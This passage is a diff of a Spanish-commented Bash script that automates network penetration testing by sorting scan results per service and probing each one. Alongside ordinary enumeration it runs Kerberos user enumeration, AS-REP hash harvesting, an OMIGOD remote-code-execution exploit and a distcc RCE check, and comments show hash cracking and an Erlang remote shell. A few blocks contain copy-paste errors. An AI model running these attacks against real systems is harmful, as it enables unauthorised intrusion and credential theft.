+	grep ":49152$" tcp.txt  | uniq >> ../servicios/GlusterFS.txt
+
+	grep ":44134$" tcp.txt  | uniq >> ../servicios/helm.txt
+	grep ":44818$" tcp.txt  | uniq >> ../servicios/EtherNet.txt
+
+	grep ":50030$" tcp.txt  | uniq >> ../servicios/hadoop-jobtracker.txt
+	grep ":50060$" tcp.txt  | uniq >> ../servicios/hadoop-tasktracker.txt
+	grep ":50070$" tcp.txt  | uniq >> ../servicios/hadoop-namenode.txt
+	grep ":50075$" tcp.txt  | uniq >> ../servicios/hadoop-datanode.txt
+	grep ":50090$" tcp.txt  | uniq >> ../servicios/hadoop-secondary.txt
 	
 cd ..
 
   
   
  ##################UDP#########
-if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then 
-	cd .escaneo_puertos
-	
-	#grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' >> ../servicios/dns.txt
-	grep --color=never ":53$" udp.txt  >> ../servicios/dns.txt
+cd .escaneo_puertos
+	#grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' | uniq >> ../servicios/dns.txt
+	grep --color=never ":53$" udp.txt  | uniq >> ../servicios/dns.txt
 	grep --color=never ":161$" udp.txt | uniq >> ../servicios/snmp2.txt
-	grep --color=never ":67$" udp.txt  >> ../servicios/dhcp.txt
-	grep --color=never ":69$" udp.txt  >> ../servicios/tftp.txt		
-	grep --color=never ":500$" udp.txt  >> ../servicios/vpn.txt		
-	grep --color=never ":1604$" udp.txt  >> ../servicios/citrix.txt		
-	grep --color=never ":1900$" udp.txt  >> ../servicios/upnp.txt		
-	grep --color=never ":623$" udp.txt  >> ../servicios/IPMI.txt				
-	cd ../
-fi
-        
+	grep --color=never ":67$" udp.txt  | uniq >> ../servicios/dhcp.txt
+	grep --color=never ":69$" udp.txt  | uniq >> ../servicios/tftp.txt		
+	grep --color=never ":500$" udp.txt  | uniq >> ../servicios/vpn.txt		
+	grep --color=never ":1604$" udp.txt  | uniq >> ../servicios/citrix.txt		
+	grep --color=never ":1900$" udp.txt  | uniq >> ../servicios/upnp.txt		
+	grep --color=never ":623$" udp.txt  | uniq >> ../servicios/IPMI.txt
+	grep --color=never ":5353$" udp.txt  | uniq >> ../servicios/mDNS.txt
+	grep --color=never ":47808$" udp.txt  | uniq >> ../servicios/BACNet.txt
+
+	
+
+	
+cd ../        
 find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
  ################################
   
    
 echo -e "########################################### "
 
-
-fi #enumerar
 
 # FASE: 3
 echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VULNERABILIDADES \n $RESET"
@@ -760,14 +1280,690 @@ echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VU
 
 curl  --max-time 10 'https://api.ipify.org?format=json' > .enumeracion/"$ip"_ip_publica.txt
 
+
+
+if [ -f servicios/ldap.txt ]
+then
+	echo -e "$OKBLUE #################### LDAP (`wc -l servicios/ldap.txt`) ######################$RESET"	    
+	while read line          
+	do        
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"` 	
+		
+		echo -e "[+] Escaneando $ip:$port"	
+		echo -e "\t[+] Obteniendo dominio y dnsHostName"				
+		nmap -n -Pn -p $port --script ldap-rootdse $ip > logs/enumeracion/"$ip"_"$port"_LDAP.txt
+		dominioAD=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
+		dnsHostName=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep dnsHostName | awk '{print $3}'`
+		
+		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt			
+		echo $dominioAD > .enumeracion/"$ip"_"$port"_dominio.txt		
+
+		#DC=htb,DC=local		
+		dominioAD=`echo "${dominioAD/,DC=/.}"`
+		DOMINIO_INTERNO=`echo "${dominioAD/DC=/}"`
+
+		###### LDAP ######
+		if [ -z "$dominioAD" ]; then			
+			echo -e "\t[i] No se pudo obtener el dominio "
+		else
+			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
+			echo "ldapsearch -x -p $port -h $ip -b $dominioAD -s sub \"(objectclass=*)\"" > logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
+			ldapsearch -x -p $port -h $ip -b $dominioAD -s sub "(objectclass=*)" >> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
+					
+			egrep -iq "successful bind must be completed|Not bind|Operation unavailable|Can't contact LDAP server" logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then						
+				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
+			else
+				echo -e "\t$OKRED[!] Conexión anónima detectada \n $RESET"
+				cp logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
+			fi
+		
+		fi # fin sin dominio
+				
+		####################        
+		
+		 echo ""
+ 	done <servicios/ldap.txt
+		
+	#insert clean data	
+	insert_data
+fi	
+
+
+
+#LDAPS
+if [ -f servicios/ldaps.txt ]
+then
+	echo -e "$OKBLUE #################### LDAPS (`wc -l servicios/ldaps.txt`) ######################$RESET"	    
+	while read line       
+	do     					
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"` 	
+		
+		echo -e "[+] Escaneando $ip:$port"	
+
+		echo -e "\t[+] Obteniendo dominio y dnsHostName"				
+		nmap -Pn -n -p $port --script ldap-rootdse $ip > logs/enumeracion/"$ip"_"$port"_LDAP.txt
+		DOMINIO_INTERNO=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
+		dnsHostName=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep dnsHostName | awk '{print $3}'`
+		
+		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt	
+				
+		if [ -z "$DOMINIO_INTERNO" ]; then
+			DOMINIO_INTERNO=`nmap -n -Pn -sT -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
+		fi
+		
+		if [ -z "$DOMINIO_INTERNO" ]; then
+			echo -e "\t[i] No se pudo obtener el dominio"
+		else
+			echo $DOMINIO_INTERNO > .enumeracion/"$ip"_"$port"_dominio.txt			
+			echo -e "\t[+] Comprobando acceso anónimo"
+			echo "ldapsearch -x -p $port -h $ip -b $DOMINIO_INTERNO -s sub \"(objectclass=*)\"" > logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
+			ldapsearch -x -p $port -h $ip -b $dominio -s sub "(objectclass=*)" >> logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
+			#ldapsearch -x -s base -b '' -H  ldap://my.lapdap.server "(objectClass=*)" "*" +  
+			egrep -iq "successful bind must be completed|Not bind|Invalid DN syntax|Can't contact LDAP server" logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then						
+				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
+			else
+				# copiar el archivo menos la primera linea
+				tail -n +2 logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt > .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
+				echo -e "\t$OKRED[!] Acceso anónimo detectado \n $RESET"
+			fi
+		
+		fi #fin sin dominio
+		
+													 
+		 echo ""
+ 	done <servicios/ldaps.txt
+	
+	#insert clean data	
+	insert_data
+fi
+
+
+
+if [ -f servicios/kerberos.txt ]
+then
+	echo -e "$OKBLUE #################### kerberos (`wc -l servicios/kerberos.txt`) ######################$RESET"	    		
+	for line in $(cat servicios/kerberos.txt); do
+        ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "[+] Escaneando $ip:$port"	
+		if [ -z "$DOMINIO_INTERNO" ]
+		then
+			DOMINIO_INTERNO=`nmap -Pn -sV -n -p $port $ip | grep 'Host:' | awk '{print $4}'`
+			echo -e "[+] \t DOMINIO_INTERNO ($DOMINIO_INTERNO)"	
+		fi				
+		
+		echo -e "[+] \t kerbrute ($DOMINIO_INTERNO)"	
+		kerbrute userenum $common_user_list --dc $ip -d $DOMINIO_INTERNO --output logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt
+		grep "VALID USERNAME" logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_"$port"_kerbrute.txt
+
+
+		if [ ! -z "$dominioAD" ]
+		then
+			GetNPUsers.py "$dominioAD"/ -no-pass -usersfile $common_user_list -format hashcat -dc-ip $ip > logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
+			grep "krb5as" logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt > .vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
+			# hashcat -m 18200 -a 0 hash.txt /media/sistemas/Passwords/Passwords/rockyou2021.txt -o cracked.txt #hash.txt tiene todos los datos no solo hash
+		fi				
+		
+		echo -e "[+] \t rpcEnumUsers"	
+		msfconsole -x "use auxiliary/scanner/smb/smb_enumusers;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt 2>/dev/null							   
+		egrep --color=never -i "Administrator" logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt  >> .enumeracion/"$ip"_"$port"_rpcEnumUsers.txt
+		
+			
+    done;           
+	insert_data
+    
+fi	
+
+
+if [ -f servicios/dns.txt ]
+then
+	echo -e "$OKBLUE #################### DNS (`wc -l servicios/dns.txt`) ######################$RESET"	  
+	for line in $(cat servicios/dns.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "[+] Escaneando $ip:$port"
+		
+		if [ "$DOMINIO_EXTERNO" != NULL  ]; then
+			DOMINIO=$DOMINIO_EXTERNO
+			echo -e "[+] DOMINIO_EXTERNO $DOMINIO_EXTERNO"
+		fi
+
+		if [ ! -z "$DOMINIO_INTERNO" ]; then
+			DOMINIO=$DOMINIO_INTERNO
+			echo -e "[+] DOMINIO_INTERNO $DOMINIO_INTERNO"
+		fi
+			
+		if [ ! -z "$DOMINIO" ]; then
+			### zone transfer ###	
+			echo -e "\t [+] Probando transferencia de zona (DOMINIO $DOMINIO)" 		
+			zone_transfer=`dig -tAXFR @$ip $DOMINIO`
+			echo "dig -tAXFR @$ip $DOMINIO" > logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
+			echo $zone_transfer >> logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
+			if [[ ${zone_transfer} != *"failed"*  && ${zone_transfer} != *"timed out"* && ${zone_transfer} != *"error"* ]];then
+				echo $zone_transfer > .vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
+				echo -e "\t$OKRED[!] Transferencia de zona detectada \n $RESET"
+			else
+				
+				echo -e "\t$OKGREEN[i] No se pudo realizar la transferencia de zona$RESET"
+			fi	
+
+			echo -e "\t [+] Bruteforce domains"
+			echo "dnsenum --threads 100 --dnsserver $ip -f $common_domains $DOMINIO" > logs/enumeracion/"$ip"_53_dnsenum.txt 
+			dnsenum --threads 100 --dnsserver $ip -f $common_domains $DOMINIO >> logs/enumeracion/"$ip"_53_dnsenum.txt 2>/dev/null
+			grep -i $DOMINIO logs/enumeracion/"$ip"_53_dnsenum.txt | grep -v dnsenum > .enumeracion/"$ip"_53_dnsenum.txt
+			
+			if [ $internet == "s" ]; then 			
+				#open resolver
+				echo -e "\t [+] Probando si es un servidor DNS openresolver"
+				dig ANY google.com @$ip +short | grep --color=never google | egrep -iv "failed|DiG" > .vulnerabilidades/"$ip"_53_openresolver.txt 2>/dev/null &																			
+			fi	
+		else
+			echo -e "\t [+] Dominio no disponible (DOMINIO = $DOMINIO)" 		
+		fi
+
+			
+	done
+	
+	# revisar si hay scripts ejecutandose
+	while true; do
+	dig_instancias=`ps aux | egrep 'dig' | grep -v digitalocean| wc -l`		
+	if [ "$dig_instancias" -gt 1 ]
+	then
+		echo -e "\t[i] Todavia hay scripts activos ($dig_instancias)"				
+		sleep 10
+		else
+			break		
+		fi
+	done	# done true	
+	#insert clean data	
+	insert_data		
+fi
+
+
+if [ -f servicios/iscsi.txt ]
+	then
+	echo -e "$OKBLUE #################### iscsi (`wc -l servicios/iscsi.txt`) ######################$RESET"	    
+	for line in $(cat servicios/iscsi.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		nmap -Pn --script=iscsi-info -p $port $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_"$port"_info.txt > .enumeracion/"$ip"_"$port"_info.txt 
+
+		iscsiadm -m discovery -t sendtargets -p $ip:$port > logs/enumeracion/"$ip"_"$port"_discovery.txt 
+		#iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --login
+		
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/SAProuter.txt ]
+	then
+	echo -e "$OKBLUE #################### SAProuter (`wc -l servicios/SAProuter.txt`) ######################$RESET"	    
+	for line in $(cat servicios/SAProuter.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		msfconsole -x "use auxiliary/scanner/sap/sap_service_discovery;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_"$port"_discovery.txt 2>/dev/null
+		grep '\[+\]' logs/enumeracion/"$ip"_"$port"_discovery.txt > .enumeracion/"$ip"_"$port"_discovery.txt
+
+		msfconsole -x "use auxiliary/scanner/sap/sap_router_info_request;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_info.txt 2>/dev/null
+		grep '\[+\]' logs/vulnerabilidades/"$ip"_"$port"_info.txt > .vulnerabilidades/"$ip"_"$port"_info.txt
+
+		#msfconsole -x "use auxiliary/scanner/sap/sap_router_portscanner;set RHOSTS $ip;set INSTANCES 00-50;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_portscanner.txt 2>/dev/null
+		#grep '\[+\]' logs/vulnerabilidades/"$ip"_"$port"_portscanner.txt > .vulnerabilidades/"$ip"_"$port"_portscanner.txt
+
+		#use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem 
+		
+
+		
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/distccd.txt ]
+	then
+	echo -e "$OKBLUE #################### distccd (`wc -l servicios/distccd.txt`) ######################$RESET"	    
+	for line in $(cat servicios/distccd.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		nmap -Pn --script=distcc-exec -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_rce.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_"$port"_rce.txt > .vulnerabilidades/"$ip"_"$port"_rce.txt 				
+		
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/svn.txt ]
+	then
+	echo -e "$OKBLUE #################### svn (`wc -l servicios/svn.txt`) ######################$RESET"	    
+	for line in $(cat servicios/svn.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		#list
+		echo "svn ls svn://$ip" > logs/enumeracion/"$ip"_"$port"_svnEnum.txt
+		svn ls svn://$ip >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
+
+		#Download the repository
+		echo "svn checkout svn://$ip" >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
+		svn checkout svn://$ip >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
+
+		#Commit history
+		echo "svn log svn://$ip"  >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
+		svn log svn://$ip  >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
+
+		#svn up -r 2 #Go to revision 2 inside the checkout folder
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/erlang.txt ]
+	then
+	echo -e "$OKBLUE #################### erlang (`wc -l servicios/erlang.txt`) ######################$RESET"	    
+	for line in $(cat servicios/erlang.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		nmap -sV -Pn -n -T4 -p $port --script epmd-info $ip >> logs/enumeracion/"$ip"_"erlang"_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_"erlang"_info.txt > .enumeracion/"$ip"_"erlangt"_info.txt 
+		
+		#erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
+		#os:cmd("id").
+
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/dockerRegistry.txt ]
+	then
+	echo -e "$OKBLUE #################### dockerRegistry (`wc -l servicios/dockerRegistry.txt`) ######################$RESET"	    
+	for line in $(cat servicios/dockerRegistry.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`	
+		DockerGraber.py http://$ip  --list > logs/vulnerabilidades/"$ip"_"$port"_auth.txt
+		grep '\[+\]' logs/vulnerabilidades/"$ip"_"$port"_auth.txt > .vulnerabilidades/"$ip"_"$port"_auth.txt 
+		#DockerGraber.py http://127.0.0.1  --dump_all
+		
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/mDNS.txt ]
+	then
+	echo -e "$OKBLUE #################### mDNS (`wc -l servicios/mDNS.txt`) ######################$RESET"	    
+	for line in $(cat servicios/mDNS.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "nmap -Pn -sUC -n  -p $port $ip" > logs/enumeracion/"$ip"_"mDNS"_info.txt 2>/dev/null
+		nmap -Pn -sUC -n  -p $port $ip >> logs/enumeracion/"$ip"_"mDNS"_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_"mDNS"_info.txt | grep -v zeroconf> .enumeracion/"$ip"_"mDNS"_info.txt 
+	
+		echo "pholus3.py eth0 -rq -stimeout 10" > logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
+		pholus3.py eth0 -rq -stimeout 10 | tee -a logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
+		cat logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null > .enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
+	done
+
+	insert_data
+fi
+
+
+
+if [ -f servicios/OMI.txt ]
+	then
+	echo -e "$OKBLUE #################### OMI (`wc -l servicios/OMI.txt`) ######################$RESET"	    
+	for line in $(cat servicios/OMI.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		#CVE-2021-38647
+		echo "omigod.py -t $ip -c id  (CVE-2021-38647)" > logs/enumeracion/"$ip"_"OMI"_info.txt 2>/dev/null
+		omigod.py -t $ip -c id >> logs/vulnerabilidades/"$ip"_"OMI"_info.txt 2>/dev/null
+		grep "uid" logs/vulnerabilidades/"$ip"_"OMI"_info.txt > .vulnerabilidades/"$ip"_"OMI"_info.txt
+
+	done
+
+	insert_data
+fi
+
+if [ -f servicios/RabbitMQ.txt ]
+	then
+	echo -e "$OKBLUE #################### RabbitMQ (`wc -l servicios/RabbitMQ.txt`) ######################$RESET"	    
+	for line in $(cat servicios/RabbitMQ.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "nmap -Pn -n --script=amqp-info -p $port $ip" > logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
+		nmap -Pn -n --script=amqp-info -p $port $ip >> logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_"RabbitMQ"_info.txt > .enumeracion/"$ip"_"RabbitMQ"_info.txt 
+
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/cassandra.txt ]
+	then
+	echo -e "$OKBLUE #################### cassandra (`wc -l servicios/cassandra.txt`) ######################$RESET"	    
+	for line in $(cat servicios/cassandra.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		echo "nmap -Pn -n --script=cassandra-info  -p $port $ip" > logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
+		nmap -Pn -n --script=cassandra-info  -p $port $ip >> logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_cassandra_info.txt > .enumeracion/"$ip"_cassandra_info.txt 
+
+		# cqlsh <IP>
+		# #Basic info enumeration
+		# SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
+		# #Keyspace enumeration
+		# SELECT keyspace_name FROM system.schema_keyspaces;
+		# desc <Keyspace_name>    #Decribe that DB
+		# desc system_auth        #Describe the DB called system_auth
+		# SELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes
+		# SELECT * from logdb.user_auth;    #Can contain credential hashes
+		# SELECT * from logdb.user;
+		# SELECT * from configuration."config";
+		
+	done
+
+	insert_data
+fi
+
+
+
+if [ -f servicios/NDMP.txt ]
+	then
+	echo -e "$OKBLUE #################### NDMP (`wc -l servicios/NDMP.txt`) ######################$RESET"	    
+	for line in $(cat servicios/NDMP.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		echo "nmap -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip" > logs/enumeracion/"$ip"_NDMP_info.txt 2>/dev/null
+		nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/vulnerabilidades/"$ip"_NDMP_info.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_NDMP_info.txt > .vulnerabilidades/"$ip"_NDMP_info.txt 
+		
+	done
+
+	insert_data
+fi
+
+if [ -f servicios/ajp13.txt ]
+	then
+	echo -e "$OKBLUE #################### ajp13 (`wc -l servicios/ajp13.txt`) ######################$RESET"	    
+	for line in $(cat servicios/ajp13.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		echo "nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip" > logs/vulnerabilidades/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
+		nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/vulnerabilidades/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_ajp13_proxyAuth.txt > .vulnerabilidades/"$ip"_ajp13_proxyAuth.txt 
+		
+	done
+
+	insert_data
+fi
+
+
+
+if [ -f servicios/InfluxDB.txt ]
+	then
+	echo -e "$OKBLUE #################### InfluxDB (`wc -l servicios/InfluxDB.txt`) ######################$RESET"	    
+	for line in $(cat servicios/InfluxDB.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "influx -host $ip -port $port " > logs/vulnerabilidades/"$ip"_influx_auth.txt
+		influx -host $ip -port $port >> logs/vulnerabilidades/"$ip"_influx_auth.txt
+
+		echo "msfconsole -x use auxiliary/scanner/http/influxdb_enum;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_influx_enum.txt
+		msfconsole -x "use auxiliary/scanner/http/influxdb_enum;set RHOSTS $ip;exploit;exit" >> logs/vulnerabilidades/"$ip"_influx_enum.txt 2>/dev/null
+		grep "[+]" logs/vulnerabilidades/"$ip"_influx_enum.txt | grep "IPMI" | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_influx_enum.txt
+
+
+		
+	done
+
+	insert_data
+fi
+
+
+
+
+if [ -f servicios/GlusterFS.txt ]
+	then
+	echo -e "$OKBLUE #################### GlusterFS (`wc -l servicios/GlusterFS.txt`) ######################$RESET"	    
+	for line in $(cat servicios/GlusterFS.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "gluster --remote-host=$ip volume list" > logs/enumeracion/"$ip"_"gluster"_list.txt
+		
+		gluster --remote-host=$ip volume list >> .enumeracion/"$ip"_"gluster"_list.txt
+
+		#mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/helm.txt ]
+	then
+	echo -e "$OKBLUE #################### helm (`wc -l servicios/helm.txt`) ######################$RESET"	    
+	for line in $(cat servicios/helm.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo "helm --host $ip:$port version" > logs/enumeracion/"$ip"_"helm"_version.txt
+		helm --host $ip:$port version  >> logs/enumeracion/"$ip"_"helm"_version.txt
+		
+	done
+
+	insert_data
+fi
+
+
+
+if [ -f servicios/EtherNet.txt ]
+	then
+	echo -e "$OKBLUE #################### EtherNet (`wc -l servicios/EtherNet.txt`) ######################$RESET"	    
+	for line in $(cat servicios/EtherNet.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "nmap -n -Pn --script=enip-info -p $port $ip" > logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
+		nmap -n -Pn --script=enip-info -p $port $ip >> logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_EtherNet_info.txt > .vulnerabilidades/"$ip"_EtherNet_info.txt
+
+		python3 -m cpppo.server.enip.list_services --list-identity -a $ip > logs/vulnerabilidades/"$ip"_EtherNet_services.txt
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/BACNet.txt ]
+	then
+	echo -e "$OKBLUE #################### BACNet (`wc -l servicios/BACNet.txt`) ######################$RESET"	    
+	for line in $(cat servicios/BACNet.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "nmap --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip" > logs/enumeracion/"$ip"_BACNet_info.txt
+		nmap --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip >> logs/enumeracion/"$ip"_BACNet_info.txt
+		grep "|" logs/enumeracion/"$ip"_BACNet_info.txt | grep -v filtered > .enumeracion/"$ip"_BACNet_info.txt
+
+	done
+
+	insert_data
+fi
+
+if [ -f servicios/hadoop-jobtracker.txt ]
+	then
+	echo -e "$OKBLUE #################### hadoop-jobtracker (`wc -l servicios/hadoop-jobtracker.txt`) ######################$RESET"	    
+	for line in $(cat servicios/hadoop-jobtracker.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_jobtracker.txt
+		nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_jobtracker.txt
+		grep "|" logs/enumeracion/"$ip"_hadoop_jobtracker.txt > .enumeracion/"$ip"_hadoop_jobtracker.txt		
+	done
+
+	insert_data
+fi
+	
+
+if [ -f servicios/hadoop-namenode.txt ]
+	then
+	echo -e "$OKBLUE #################### hadoop-namenode (`wc -l servicios/hadoop-namenode.txt`) ######################$RESET"	    
+	for line in $(cat servicios/hadoop-namenode.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+ 		echo "nmap -n -Pn --script hadoop-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_namenode.txt
+		nmap -n -Pn --script hadoop-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_namenode.txt
+		grep "|" logs/enumeracion/"$ip"_hadoop_namenode.txt > .enumeracion/"$ip"_hadoop_namenode.txt		
+	done
+
+	insert_data
+fi
+
+if [ -f servicios/hadoop-datanode.txt ]
+	then
+	echo -e "$OKBLUE #################### hadoop-datanode (`wc -l servicios/hadoop-datanode.txt`) ######################$RESET"	    
+	for line in $(cat servicios/hadoop-datanode.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+ 		echo "nmap -n -Pn --script hadoop-datanode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_datanode.txt
+		nmap -n -Pn --script hadoop-datanode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_datanode.txt
+		grep "|" logs/enumeracion/"$ip"_hadoop_datanode.txt > .enumeracion/"$ip"_hadoop_datanode.txt		
+	done
+	insert_data
+fi
+
+
+if [ -f servicios/hadoop-secondary.txt ]
+	then
+	echo -e "$OKBLUE #################### hadoop-secondary (`wc -l servicios/hadoop-secondary.txt`) ######################$RESET"	    
+	for line in $(cat servicios/hadoop-secondary.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+ 		echo "nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_secondary.txt
+		nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_secondary.txt
